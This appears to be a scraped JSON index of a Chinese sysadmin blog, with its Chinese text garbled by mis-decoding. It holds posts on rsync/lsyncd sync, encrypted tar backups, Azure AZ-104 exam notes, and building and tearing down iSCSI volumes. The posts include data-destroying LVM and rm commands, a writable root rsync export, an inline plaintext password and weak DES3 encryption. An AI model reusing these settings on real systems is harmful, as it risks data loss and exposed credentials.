13# exclude = lost+found/ 14# transfer logging = yes 15# timeout = 900 16# ignore nonreadable = yes 17# dont compress = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2 18 19# [ftp] 20# path = /home/ftp 21# comment = ftp export area 22uid = root 23gid = root 24use chroot = no 25max connections = 200 26timeout = 300 27pid file = /var/run/rsyncd.pid 28lock file = /var/run/rsync.lock 29log file = /var/log/rsyncd.log 30 31[new] 32path = /root 33ignore errors 34read only = false 35list = false 36hosts allow = 172.18.34.38 37hosts deny = 0.0.0.0/32 æ³¨æ„ï¼šå¦‚æœç›®å½•ä¸‹æ–‡ä»¶æ•°è¿‡å¤šï¼Œéœ€è¦åŠ å¤§å†…æ ¸watchesæŒ‡æ ‡\n1fs.inotify.max_user_watches=524288 è¿™æ˜¯ä¸ªæç«¯å¼ºåŠ›çš„å·¥å…·ï¼Œå¢™è£‚æ¨èï¼ã€‚\n","date":"2023-12-08","img":"","permalink":"https://rendoumi.com/posts/20231208-lsync/","series":null,"tags":null,"title":"Lsync åŒæ­¥è½¯ä»¶çš„è¿ç”¨"},{"categories":null,"content":"å®¡è®¡çš„éœ€æ±‚ï¼Œéœ€è¦å®šæœŸå¤‡ä»½æ–‡ä»¶ï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¿™äº›å‹ç¼©åŒ…éœ€è¦åŠ å¯†ä¿å­˜ï¼Œæ¢å¤çš„æ—¶å€™éœ€è¦å¯†ç æ‰èƒ½æ¢å¤ï¼š\næŠŠç›®å½• 20231224å‹ç¼©è¿›åŠ å¯†åŒ…ï¼š\n1tar -zcvf - 20231224|openssl des3 -salt -k \u0026lt;password\u0026gt; | dd of=/backup/cdrom/20231224.tar.gz.des3 è§£å‹ï¼š\n1dd if=/backup/cdrom/20231224.tar.gz.des3 |openssl des3 -d -k \u0026lt;password\u0026gt;|tar zxf - ","date":"2023-12-08","img":"","permalink":"https://rendoumi.com/posts/20231208-encrypt_tar/","series":null,"tags":null,"title":"LinuxåŠ å¯†å‹ç¼©taråŒ…"},{"categories":null,"content":"åœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œè€ƒäº†AZ-104å’ŒAZ-305ï¼Œæäº†ä¸€å¼ ä¸“å®¶è¯ä¹¦ï¼Œä»Šå¹´çš„è€ƒè¯•åˆ°å¤´äº†ã€‚\næ˜å¹´ç”¨å…è´¹azureè€ƒè¯•æŠµæ‰£ç¨ï¼ŒçœŸæ˜¯ä¸€ä»¶å¥½äº‹ã€‚\n","date":"2023-09-21","img":"","permalink":"https://rendoumi.com/posts/20230921-azure_certificate/","series":null,"tags":null,"title":"ä»Šå¹´ä¸‹åŠå¹´çš„ä¸¤å¼ Azureè®¤è¯"},{"categories":null,"content":"åœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œä¸€å¼ æ˜¯115$ï¼Œæ€•æµªè´¹å•Šï¼Œå°±åˆ†åˆ«è€ƒäº†AZ-104å’ŒAZ-305ï¼ŒåŸºæœ¬ä¸Šä½ 104èƒ½è¿‡ï¼Œ305å°±æ²¡æœ‰é—®é¢˜ï¼Œaz-104æŒºå¤šçŸ¥è¯†ç‚¹çš„ï¼Œæœ€è®¨åŒçš„æ˜¯æ­¥éª¤é¢˜ï¼Œä¸çŸ¥é“æ­»è®°é‚£äº›æ­¥éª¤æœ‰ä½•æ„æ€ï¼ŒæŠŠ104çš„çŸ¥è¯†è¦ç‚¹åˆ†åˆ—å¦‚ä¸‹ï¼š\nResourceGroupçš„ Tagä¸ä¼šè¢«resourceç»§æ‰¿ï¼Œæ–°å»ºçš„policyåªé’ˆå¯¹æ–°æ·»åŠ å’Œæ›´æ–°çš„resourceç”Ÿæ•ˆï¼Œå¯¹æ²¡æœ‰ä¿®æ”¹çš„resourceä¸ç”Ÿæ•ˆï¼Œå¦å¤–éœ€è¦å…³æ³¨policyçš„definationæ˜¯åªé’ˆå¯¹resourceè¿˜æ˜¯åŒ…æ‹¬resource groups Adds the specified tag and value when any resource missing this tag is created or updated. Existing resources can be remediated by triggering a remediation task. If the tag exists with a different value it will not be changed. Does not modify tags on resource groups.\nResize Availability Setä¸‹çš„VMï¼Œ éœ€è¦åœæ­¢Availability Setä¸‹æ‰€æœ‰çš„VM If the VM you wish to resize is part of an availability set, then you must stop all VMs in the availability set before changing the size of any VM in the availability set.\nThe number of fault domains for managed availability sets varies by region - either two or three per region. Each virtual machine in your availability set is assigned an update domain and a fault domain by the underlying Azure platform. For a given availability set, five non-user-configurable update domains are assigned by default (Resource Manager deployments can then be increased to provide up to 20 update domains) to indicate groups of virtual machines and underlying physical hardware that can be rebooted at the same time.\nYou need to make sure that the password cannot be stored in plain text.You are preparing to create the necessary components to achieve your goal. Key vault + access policy\nThe Add-AzVhd cmdlet uploads on-premises virtual hard disks, in .vhd file format, to a blob storage account as fixed virtual hard disks.\nrecovery For physical servers - Storage Account - Azure Recovery Services Vault - Replication policy https://docs.microsoft.com/en-us/azure/site-recovery/physical-azure-disaster-recovery For Hyper-v server - Hyper-V site - Azure Recovery Services Vault - Replication policy https://docs.microsoft.com/en-nz/azure/site-recovery/hyper-v-prepare-on-premises-tutorial If you make a change to the topology of your network and have Windows VPN clients, the VPN client package for Windows clients must be downloaded and installed again in order for the changes to be applied to the client\nTo configure an Azure internal load balancer as a listener for the availability group, you need to create a TCP health probe on port 1433, which is the default port for SQL Server.\nEach VM will have a minimum of 1 NIC, which can have one or more IPs associated to it(include public and privite ip)\nYou can only restore a VM to the original VM or a new Azure VM. Azure Backup is a cloud-based backup solution, and it doesn\u0026rsquo;t support restoring VMs to on-premise Windows devices.\nYou can set expiration policy only for Office 365 groups in Azure Active Directory (Azure AD).\nEach management group and subscription can only support one parent\nGroups can contain both registered and joined devices as members. Cloud device admin cannot add/join devices,user admin can add device/user/groups, Dynamic groups dont require manual intervention, it uses criteria to add or remove devices/users/groups only assigned groups you can add\nYou can\u0026rsquo;t delete a Recovery Services vault with any of the following dependencies: You can\u0026rsquo;t delete a vault that contains backup data. Once backup data is deleted, it will go into the soft deleted state. You can\u0026rsquo;t delete a vault that contains backup data in the soft deleted state.\nBefore you can delete a Recovery Service vault that contains protected virtual machines, you need to stop the backup of each backup item.\nIf you want to change the recovery service vault you need to disassociate the previous RSV and delete the backup data. To delete backup data, you need to stop the backup first.\nRecover Servies vault backup need resource in the same location with vault. to create a Vault to protect VMs, the Vault must be in the same Region as the VMs. VM,SQL,file share support be backuped by Recover Servies vault Blobs cannot be backup up to service vaults.\nAzure RBAC is the authorization system you use to manage access to Azure resources.\nAzure (RBAC) and Azure AD roles are independent. AD roles do not grant access to resources and Azure roles do not grant access to Azure AD.\nAzure AD Roles like Global Administrator dont provided access to resources. For that RBAC Roles need to be aplied to the users.\nAdvisor helps you optimize and reduce your overall Azure spend by identifying idle and underutilized resources. You can get cost recommendations from the Cost tab on the Advisor dashboard.\nYou can adjust the guest user settings, their access, who can invite them from \u0026ldquo;External collaboration settings\u0026rdquo;\nYou must use Windows Server Active Directory to update the identity, contact info, or job info for users whose source of authority is Windows Server Active. Usage location is an Azure property that can only be modified from Azure AD (for all users including Windows Server AD users synced via Azure AD Connect).\nYour account must have any one of the following Azure roles at the subscription scope to enable traffic analytics: owner, contributor, reader, or network contributor. https://docs.microsoft.com/en-us/azure/network-watcher/traffic-analytics#user-access-requirements both Tags and Locks are available to Subscriptions, Resource Groups, and Resources.\nAdministrative units restrict permissions in a role to any portion of your organization that you define.\nOwner = Grants full access to manage all resources, including the ability to assign roles in Azure RBAC. Contributor = Grants full access to manage all resources, but does NOT allow you to assign roles in Azure RBAC. (you cannot add users or changes their rights) User Access Administrator = Lets you manage user access to Azure resources. Reader = View all resources, but does not allow you to make any changes. Security Admin = View and update permissions for Security Center. Same permissions as the Security Reader role and can also update the security policy and dismiss alerts and recommendations. Network Contributor = Lets you manage networks, but not access to them. (so you can add VNET, subnet, etc)\nBefore you enable Azure AD over SMB for Azure file shares, make sure you have completed the following prerequisites: \\1. Select or create an Azure AD tenant. \\2. To support authentication with Azure AD credentials, you must enable Azure AD Domain Services for your Azure AD tenant.\nyou can assign policy to Tenant Root Group,ManagementGroup1,Subscription1 and RG1 you can exclude policy from ManagementGroup1,Subscription1,RG11 and VM1\nBuilt-in AD roles can\u0026rsquo;t be cloned, but built-in subscription roles can be. Custom roles of either type can be cloned.\nGroup-based licensing currently does not support groups that contain other groups (nested groups). If you apply a license to a nested group, only the immediate first-level user members of the group have the licenses appliedï¼ˆlicenseä¸æ”¯æŒåµŒå¥—groupï¼‰\nNesting is currently not supported for groups that can be assigned to a role. ï¼ˆroleä¸æ”¯æŒgroupåµŒå¥—ï¼‰\nGeneral-purpose v2 (GPv2) accounts are storage accounts that support all of the latest features for blobs, files, queues, and tables. Blob storage accounts support all the same block blob features as GPv2, but are limited to supporting only block blobs. General-purpose v1 (GPv1) accounts provide access to all Azure Storage services, but may not have the latest features or the lowest per gigabyte pricing.\nYou may only tier your object storage data to hot, cool, or archive in Blob storage and General Purpose v2 (GPv2) accounts. General Purpose v1 (GPv1) accounts do not support tiering.\nGeo-redundant storage (GRS): Cross-regional replication to protect against region-wide unavailability. Locally-redundant storage (LRS): A simple, low-cost replication strategy. Data is replicated within a single storage scale unit. Read-access geo-redundant storage (RA-GRS): Cross-regional replication with read access to the replica. RA-GRS provides read-only access to the data in the secondary location, in addition to geo-replication across two regions, but is more expensive compared to GRS.\nA sync group contains one cloud endpoint, or Azure file share, and at least one server endpoint. Azure File Sync does not support more than one server endpoint from the same register server in the same Sync Group. Multiple server endpoints can exist on the same volume if their namespaces are not overlapping (for example, F:\\sync1 and F:\\sync2) and each endpoint is syncing to a unique sync group.\nServer Point synced quick, cloud point sync in 24 hours. cloud endpoint, and it is scanned by the detection job every 24 hours the on-premises servers the file is scanned and synced automatically after it\u0026rsquo;s being added.\nAzCopy is a command-line utility that you can use to copy blobs or files to or from a storage account.\nBoth Azure Active Directory (AD) and Shared Access Signature (SAS) token are supported for Blob storage. Only Shared Access Signature (SAS) token is supported for File storage.\nThe location and subscription where this Log Analytics workspace can be created is independent of the location and subscription where your vaults exist. vaultå’Œlog analytics workspaceä¸æŒ‰ç…§locationå’ŒsubscriptionåŒºåˆ† Storage Account must be in the same Region as the Recovery Services Vault.\nPremium file shares are hosted in a special purpose storage account kind, called a FileStorage account. The archive tier supports only LRS, GRS, and RA-GRS.\nServer Message Block (SMB) is used to connect to an Azure file share over the internet. The SMB protocol requires TCP port 445 to be open. Incorrect Answers: Port 80 is required for HTTP to a web server Port 443 is required for HTTPS to a web server Port 3389 is required for Remote desktop protocol (RDP) connections\nWhile a blob is in archive storage, the blob data is offline and can\u0026rsquo;t be read or modified. To read or download a blob in archive, you must first rehydrate it to an online tier.\nbackup VM1 and make sure backup data are stored across three availability zones in the primary region. Create Recovery Services Vault, Set Replication Policy to ZRS (because of the requirement for having in three separate zones) For VM1, create a backup policy\nAzure storage encryption supports RSA and RSA-HSM keys of sizes 2048, 3072 and 4096\nStorage account policy: Maximum number of Stored access policies is 5 Maximum number of Immutable blob storage is 2\nLifecycle management policies are supported for block blobs and append blobs in general-purpose v2, premium block blob, and Blob Storage accounts. Only storage accounts that are configured for LRS, GRS, or RA-GRS support moving blobs to the archive tier. The archive tier isn\u0026rsquo;t supported for ZRS, GZRS, or RA-GZRS accounts.(No Z)\nAccording to documentation only Premium file shares (FileStorage), LRS/ZRS are supported for SMB.\nAzure Blob Storage provides containers for storing blobs and queues for storing messages. Both containers and queues support conditions when assigning RBAC roles to specific resources within the storage account, allowing for more granular access control based on certain conditions.\nIf you want to select an existing virtual network, make sure it\u0026rsquo;s in the same location and Azure subscription as your Kubernetes cluster. VNet should be same location with AKS.\nWe cannot just move a virtual machine between networks. What we need to do is identify the disk used by the VM, delete the VM itself while retaining the disk, and recreate the VM in the target virtual network and then attach the original disk to it.\nWeb App can only created and identified in App Service plan in same region and resource group.\nTo install kubectl locally, use the az aks install-cli command.\nUse Azure Automation State Configuration to manage the ongoing consistency of the virtual machine configurations steps Step 1: Create and upload a configuration to Azure Automation Step 2: Compile a configuration into a node configuration Step 3: Register a VM to be managed by State Configuration Step 4: Specify configuration mode settings Step 5: Assign a node configuration to a managed node Step 6: Check the compliance status of a managed node\nAnswer in exam 1: Upload a configuration to Azure Automation State Configuration 2: Compile a configuration into a node configuration 3: Check the compliance status of the node.\nWhen you redeploy a VM, it moves the VM to a new node within the Azure infrastructure and then powers it back on, retaining all your configuration options and associated resources. å½“Azure ç»´æŠ¤å¯¼è‡´VMéœ€è¦shutdownæ—¶ï¼Œä½¿ç”¨è¯¥æ–¹å¼åˆ‡æ¢\nTo migrate a VM from a VNET to another VNET. The only option is to delete the VM and redeploy it using a new NIC and NIC connected to VNET2.\nWhile resizing the VM it must be in a stopped state.\nrecord all the successful and failed connection attempts to VM1. 1.Create a VM with a network security group 2.Enable Network Watcher and register the Microsoft.Insights provider 3.Enable a traffic flow log for an NSG, using Network Watcher\u0026rsquo;s NSG flow log capability 4.Download logged data 5.View logged data\nScaleSetVM orchestration mode: Virtual machine instances added to the scale set are based on the scale set configuration model. The virtual machine instance lifecycle - creation, update, deletion - is managed by the scale set. It the current default VMSS behavior. (Scale set VMs are created in a single shot). VM (virtual machines) orchestration mode: Virtual machines created outside of the scale set can be explicitly added to the scale set. The orchestration mode VM will only create an empty VMSS without any instances, and you will have to manually add new VMs into it by specifying the VMSS ID during the creation of the VM. (Separately VMs are created and added to scale set later)\nRecover Servies vault backup need resource in the same location with vault. to create a Vault to protect VMs, the Vault must be in the same Region as the VMs.\nYou can assign an NSG to the subnet of the virtual network in the same region\nBy default, Azure virtual machines can communicate only with other virtual machines that are connected to the same virtual network. If you want a virtual machine to communicate with other virtual machines that are connected to other virtual networks, you must configure network peering.\nYou can use a network security group (NSG) to be assigned to a network interface. NSGs can be associated with subnets or individual virtual machine instances within that subnet. When an NSG is associated with a subnet, the access control list (ACL) rules apply to all virtual machine instances of that subnet.\nApplication gateway allows you to configure load-balanced virtual machines on a private IP address and provide a web app firewall to block any SQL injection, header, and cross-site scripting XSS attacks. An internal load balancer cannot provide load balancing on a public front. A network security group (NSG) is only used to open ports on virtual machines. A public load balancer does not provide web app firewall capabilities to block attacks.\nAzure Application Gateway is a web traffic load balancer that operates at Layer 7 of the OSI model. Application Gateway can make routing decisions based on additional attributes of an HTTP request, such as the URI path or host headers.\nYou can detach a disk from a running virtual machine (hot removal).\nAzure Spot instances allow you to provision virtual machines at a reduced cost, but these virtual machines can be stopped by Azure when Azure needs the capacity for other pay-as-you-go workloads, or when the price of the spot instance exceeds the maximum price that you have set. These virtual machines are good for dev, testing, or for workloads that do not require any specific SLA.\nOnly zone-redundant replication (ZRS) supports StorageV2, FileStorage, and BlockBlobStorage accounts. Live migration is not supported for read-access geo-redundant storage (RA-GRS) and only standard storage accounts can be used.\nFor accessing the file share, port 445 must be open. Port 5671 is used to send health information to Azure AD.\nBy default, backups of virtual machines are kept for 30 days.\nA maximum of one SMS message can be sent every five minutes. Therefore, a maximum of 12 messages will be sent per hour.\nYour VMs should use managed disks if you want to move them to an Availability Zone by using Site Recovery\nBasic Azure Load Balancer supports deployment in a single availability zone. Basic Azure Load Balancer supports only Basic SKU public IP. Azure Standard Load Balancer is zone-redundant, but has a higher cost.\nYou can use delete locks to block the deletion of virtual machines, subscriptions, and resource groups. You cannot use delete locks on management groups or storage account data.\nCommand in SecurityEvent table in Azure Monitor. Summarize is used to group records from one or more columns of data. Where is used to filter the rows. Project is used to rename and select columns. Extend is used to add columns.\nYou can use the Log Analytics agent for Linux as part of a solution to collect JSON output from the Linux virtual machines.\nThe Azure Custom Script Extension is used for post-deployment configuration, software installation, or any other configuration or management task.\nDesired State Configuration (DSC) is a management platform that you can use to manage an IT and development infrastructure with configuration as code.\nThe Azure VMAccess extension acts as a KVM switch that allows you to access the console to reset access to Linux or perform disk-level maintenance.\nA lifecycle management rule can be used to move or delete blobs automatically. The rule can be based on the time the blob was last modified or the time the blob was last accessed (read or write). To perform an action based on the access time, access tracking must be enabled. This can incur additional storage costs.\nAdd-AzVhd: Uploads an on-premises VHD to Azure New-AzVM: Used to create a new virtual machine New-AzDisk: Used to create a managed disk New-AzDataShare: Used to create an Azure data share\nVersioning must be enabled for the source and target. An object type container is needed to replicate the images. You must create a StandardV2 storage account. File shares are not needed, and queues are unsupported for replication.\nAzure Network Watcher is a regional service that allows you to monitor and diagnose conditions at a network scenario level in, to, and from Azure. When you create or update a virtual network in a subscription, Network Watcher will be enabled automatically in the virtual network\u0026rsquo;s region. There is no impact on resources or associated charges for automatically enabling Network Watcher.\nYou can use API server authorized IP ranges if you want to maintain a public endpoint for the API server while restricting access to a set of trusted IP ranges. You can use a private cluster if you want to limit the API server to be accessible only from within your virtual network.\nObject replication can be used to replicate blobs between storage accounts. Before configuring object replication, you must enable blob versioning for both storage accounts, and you must enable the change feed for the source account.\nData pinned on a shared dashboard can only be displayed for a maximum of 14 days.\nBy default, backups of virtual machines are kept for 30 days.\nA timed-based retention policy or legal hold policies can be applied to block deletion. Immutability policies can be scoped to a blob version or to a container.\nSMS: No more than 1 SMS every 5 minutes. âœ‘ Voice: No more than 1 Voice call every 5 minutes. âœ‘ Email: No more than 100 emails in an hour. âœ‘ Other actions are not rate limited.\nTo create a vault to protect virtual machines, the vault must be in the same region as the virtual machines\nUse the az aks command and the Azure portal to configure cluster autoscaler for AKS1.\nThe Linux Diagnostic Extension should be used which downloads the Diagnostic Extension (LAD) agent on Linux server.\nthe DNS port 53\no deploy a YAML file, the command is: kubectl apply -f \u0026lt;file_name\u0026gt;.yaml\nThe virtual machine you attach a network interface to and the virtual network you connect it to must exist in the same location,\nYou can target your deployment to a resource group, subscription, management group, or tenant. Depending on the scope of the deployment, you use different commands. To deploy to a resource group, use New-AzResourceGroupDeployment. To deploy to a tenant, use New-AzTenantDeployment. To deploy to a subscription, use New-AzSubscriptionDeployment which is an alias of the New-AzDeployment cmdlet. To deploy to a management group, use New-AzManagementGroupDeployment.\nApp Service can back up the following information to an Azure storage account and container that you have configured your app to use App configuration - File content - Database connected to your app -\nAzure Web Application Firewall (WAF) on Azure Application Gateway provides centralized protection of your web applications from common exploits and vulnerabilities. Web applications are increasingly targeted by malicious attacks that exploit commonly known vulnerabilities.\nA public and a private IP address can be assigned to a single network interface.\nThe virtual machines are registered (added) to the private zone as A records pointing to their private IP addresses.\nBefore creating a network interface, you must have an existing virtual network in the same location and subscription you create a network interface in.\nWith Azure CNI, every pod gets an IP address from the subnet and can be accessed directly. These IP addresses must be unique across your network space.\nThe connection monitor capability monitors communication at a regular interval and informs you of reachability, latency, and network topology changes between the VM and the endpoint\nload balancers with VMs The Basic tier load balancer is quite restrictive. A load balancer is restricted to a single availability set, virtual machine scale set, or a single machine. The Standard tier load balancer can span any virtual machine in a single virtual network, including blends of scale sets, availability sets, and machines.\nAzure DNS provides automatic registration of virtual machines from a single virtual network that\u0026rsquo;s linked to a private zone as a registration virtual network.\nA Site-to-Site (S2S) VPN gateway connection is used to connect your on-premises network to an Azure virtual network over an IPsec/IKE (IKEv1 or IKEv2) VPN tunnel. IKEv2 supports 10 S2S connections, while IKEv1 only supports 1.\nNetwork Watcher variable packet capture allows you to create packet capture sessions to track traffic to and from a virtual machine. Packet capture helps to diagnose network anomalies both reactively and proactively.\nVM apply azure firewall shoule use same location with Azure firewall A Basic Load Balancer supports virtual machines in a single availability set or virtual machine scale set\n","date":"2023-09-13","img":"","permalink":"https://rendoumi.com/posts/20230913-az-104/","series":null,"tags":null,"title":"Azureè®¤è¯az-104çš„è€ƒç‚¹"},{"categories":null,"content":"ä¸Šä¸€ç¯‡æˆ‘ä»¬ç”¨losetupå»ºäº†ä¸€ä¸ªiscsiå·ï¼Œç°åœ¨ç©ºé—´ä¸å¤Ÿäº†ï¼Œéœ€è¦é‡Šæ”¾æ‰ä¹‹å‰å»ºç«‹çš„iscsi-volumesçš„20Tç©ºé—´ã€‚\né¦–å…ˆå»isciå·çš„å®¿ä¸»æœºæŸ¥çœ‹ä¸€ä¸‹\n1targetcli ls / å¼€å§‹åˆ é™¤ï¼Œå…ˆåˆ é™¤backstoresï¼Œç„¶åæ˜¯iscsiï¼Œlvï¼Œvgï¼Œpv:\n1# targetcli /backstores/block delete vg-targetd:pvc-harbor 2Deleted storage object vg-targetd:pvc-harbor. 3# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-48 4Deleted storage object vg-targetd:pvc-vis-18-31-48. 5# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-49 6Deleted storage object vg-targetd:pvc-vis-18-31-49. 7 8# targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18 9Deleted Target iqn.2020-07.com.ddky:renhe-18-30-18. 10# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-48 11Deleted Target iqn.2020-10.com.ddky:vis-18-31-48. 12# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-49 13Deleted Target iqn.2020-10.com.ddky:vis-18-31-49. 14 15# lvs 16 LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert 17 pvc-harbor vg-targetd -wi-a----- 200.00g 18 pvc-vis-18-31-48 vg-targetd -wi-a----- 80.00g 19 pvc-vis-18-31-49 vg-targetd -wi-a----- 80.00g 20# lvremove /dev/vg-targetd/pvc-harbor 21Do you really want to remove active logical volume vg-targetd/pvc-harbor? [y/n]: y 22 Logical volume \u0026#34;pvc-harbor\u0026#34; successfully removed 23# lvremove /dev/vg-targetd/pvc-vis-18-31-48 24Do you really want to remove active logical volume vg-targetd/pvc-vis-18-31-48? [y/n]: y 25 Logical volume \u0026#34;pvc-vis-18-31-48\u0026#34; successfully removed 26# lvremove /dev/vg-targetd/pvc-vis-18-31-49 27Do you really want to remove active logical volume vg-targetd/pvc-vis-18-31-49? [y/n]: y 28 Logical volume \u0026#34;pvc-vis-18-31-49\u0026#34; successfully removed 29 30# vgremove vg-targetd 31 Volume group \u0026#34;vg-targetd\u0026#34; successfully removed 32# lvs 33# vgs 34# pvs 35 PV VG Fmt Attr PSize PFree 36 /dev/loop0 lvm2 --- 19.53t 19.53t 37 38# pvremove /dev/loop0 39 Labels on physical volume \u0026#34;/dev/loop0\u0026#34; successfully wiped. ä¸€æ•´å¥—ä¸‹æ¥ï¼ŒåŸºæœ¬éƒ½å¹²å‡€äº†ã€‚\næœ€åæ¸…ç†æ–‡ä»¶ï¼Œæ³¨æ„å¦‚æœä¸åœæ‰targetdæœåŠ¡ï¼Œæ˜¯æ— æ³•remove loopè®¾å¤‡çš„\n1systemctl stop targetd 2losetup -a 3losetup -d /dev/loop0 4losetup -a 5cd /glusterfs/iscsi-volumes 6rm -f k8s-iscsi-volumes.img è¿™æ ·å°±å¤šäº†20Tç£ç›˜ç©ºé—´ã€‚\n","date":"2023-09-05","img":"","permalink":"https://rendoumi.com/posts/20230905-iscsi_volume_release/","series":null,"tags":null,"title":"Iscsiå·çš„é‡Šæ”¾"},{"categories":null,"content":"å¦‚æœæœºå™¨çš„ç£ç›˜ç©ºé—´ä¸å¤Ÿï¼Œå¯ä»¥ç”¨iscsiæŠŠæœåŠ¡å™¨172.18.30.18ä¸Šé¢åˆ’å‡ºä¸€ç‰‡ç©ºé—´ï¼Œè¿œç¨‹æŒ‚ä¸Šæ¥ç”¨ã€‚\næ³¨æ„ï¼ŒæœåŠ¡å™¨ç”¨losetupçš„è¿™ç§åšæ³•æ˜¯ä¸ºäº†å°†æ¥k8sä¹Ÿå¯ä»¥è¿™æ ·ç”¨åŠ¨æ€iscsiå·\næœåŠ¡å™¨ç«¯å®‰è£… ç™»å½•172.18.30.18\nå®‰è£…ï¼š\n1yum install -y targetcli targetd` ç”¨æ–‡ä»¶æ¥è™šæ‹ŸLVMå·ï¼š\n1cd /glusterfs/iscsi-volumes/ 2ç”Ÿæˆ20TBæ–‡ä»¶ 3dd if=/dev/zero of=k8s-iscsi-volumes.img bs=1G count=20000 4export LOOP=`losetup -f` 5losetup $LOOP k8s-iscsi-volumes.img 6vgcreate vg-targetd $LOOP ä¿®æ”¹targetd.yaml:\n1vi /etc/target/targetd.yaml 2password: xxxxxxxx 3# defaults below; uncomment and edit 4# if using a thin pool, use \u0026lt;volume group name\u0026gt;/\u0026lt;thin pool name\u0026gt; 5# e.g vg-targetd/pool 6pool_name: vg-targetd 7user: admin 8ssl: false 9target_name: iqn.2020-04.com.ddky:renhe-18-30-18 æ³¨æ„ï¼Œè¿™ä¸ªæ–‡ä»¶ç”Ÿæˆåï¼Œå°±ä¸éœ€è¦æ”¹åŠ¨äº†ï¼Œå¦‚æœä»¥åtarget_nameå˜äº†ï¼Œä¹Ÿä¸ç”¨ç®¡ï¼Œä¹Ÿä¸éœ€è¦é‡å¯targetd\nå¯åŠ¨æœåŠ¡ï¼š\n1systemctl enable --now target 2systemctl enable --now targetd è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼Œçœ‹çœ‹æ˜¾ç¤ºç»“æœ pvdisplay vgdisplay lvdisplay targetcli ls /\næ³¨æ„ï¼šlvdisplayç»“æœå’Œtargetcli ls /ç»“æœéƒ½æ˜¯ç©º\nå¦‚æœæœ‰å®šä¹‰å¥½çš„iscsiï¼Œ3260ç«¯å£æ‰ä¼šå¼€æ”¾ã€‚æ‰€ä»¥ç°åœ¨åªå¼€å¯äº†18700çš„targetdï¼Œ3260æœªå¼€æ”¾ä¸­ã€‚\nå¦‚æœä»¥åå®šä¹‰å¥½äº†ï¼Œé‚£ä¹ˆæ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾ï¼š\né‚£å¦‚æœæƒ³è¦å½»åº•åˆ é™¤æŸä¸ªå·²ç»å­˜åœ¨çš„iscsiå·ï¼Œä¸‰æ­¥æ›²ï¼š\n1é¦–å…ˆåˆ æ‰blockè®¾å¤‡ 2targetcli /backstores/block delete vg-targetd:pvc-harbor 3 4ç„¶ååˆ é™¤iscsi 5targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18 6 7æœ€ååˆ é™¤lv 8lvremove /dev/vg-targetd/pvc-harbor å»ºç«‹æ–°çš„å·çš„æ–¹æ³•ï¼š\n1å»ºç«‹æ–°çš„lv pvc-harbor, 200G 2lvcreate -L 200G -n pvc-harbor vg-targetd 3 4å»ºç«‹æ–°çš„blockè®¾å¤‡ 5targetcli /backstores/block create vg-targetd:pvc-harbor /dev/vg-targetd/pvc-harbor 6 7å»ºç«‹æ–°çš„iqn 8targetcli /iscsi create iqn.2020-07.com.ddky:renhe-18-30-18 9 10å»ºç«‹æ–°çš„lunï¼Œportalä¼šè‡ªåŠ¨å»ºç«‹ï¼Œ3260ç«¯å£ä¼šå¼€æ”¾ 11targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/luns create /backstores/block/vg-targetd:pvc-harbor 12 13å»ºç«‹æ–°çš„acls 14targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls create iqn.2020-07.com.ddky:harbor-18-31-28 15 16è®¾ç½®aclsçš„é‰´æƒ 17targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls/iqn.2020-07.com.ddky:harbor-18-31-28 set attribute authentication=0 18targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls/iqn.2020-07.com.ddky:harbor-18-31-28 set auth userid=admin password=nishiwode 19 20å¦‚æœlunåªå¯¹srv2å¼€æ”¾ï¼Œä¸å¯¹srv1å¼€æ”¾ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š 21/\u0026gt; iscsi/iqn.2003-01.local.rhce.ipa:target/tpg1/acls create iqn.1994-05.com.redhat:srv1 add_mapped_luns=false 22/\u0026gt; iscsi/iqn.2003-01.local.rhce.ipa:target/tpg1/acls create iqn.1994-05.com.redhat:srv2 okï¼Œå¦‚ä¸Šï¼ŒæœåŠ¡å™¨ç«¯å°±è®¾ç½®å¥½äº†\nè¿™é‡Œæ²¡æœ‰é‡å¯ï¼Œåªæ˜¯è¿è¡Œäº†targetcli saveconfig å®æµ‹ï¼ŒçœŸçš„ä¸éœ€è¦é‡å¯targetï¼Œsystemctl restart target\nå®¢æˆ·ç«¯å®‰è£… å®‰è£…iscsiå®¢æˆ·ç«¯\n1yum install iscsi-initiator-utils -y ä¿®æ”¹initiatorname.iscsiï¼Œä¹Ÿå°±æ˜¯è‡ªå·±çš„iqnå·\n1vi /etc/iscsi/initiatorname.iscsi 2InitiatorName=iqn.2020-07.com.ddky:harbor-18-31-28 ä¿®æ”¹iscsid.conf\n1vi /etc/iscsi/iscsid.confï¼Œå¢åŠ 3è¡Œ 2node.session.auth.authmethod = CHAP 3node.session.auth.username = admin 4node.session.auth.password = xxxxxxxx é‡å¯æœåŠ¡ï¼š\n1systemctl restart iscsid å‘ç°ä¸€ä¸‹å¯¹ç«¯ï¼š\n1# iscsiadm -m discovery -t sendtargets -p 172.18.30.18:3260 2172.18.30.18:3260,1 iqn.2020-07.com.ddky:renhe-18-30-18 ç™»å½•ISCSIï¼š\n1# iscsiadm -m node -T iqn.2020-07.com.ddky:renhe-18-30-18 -p 172.18.30.18:3260 --login 2Logging in to [iface: default, target: iqn.2020-07.com.ddky:renhe-18-30-18, portal: 172.18.30.18,3260] (multiple) 3Login to [iface: default, target: iqn.2020-07.com.ddky:renhe-18-30-18, portal: 172.18.30.18,3260] successful. æŸ¥çœ‹session:\n1iscsiadm -m session -P3 | less 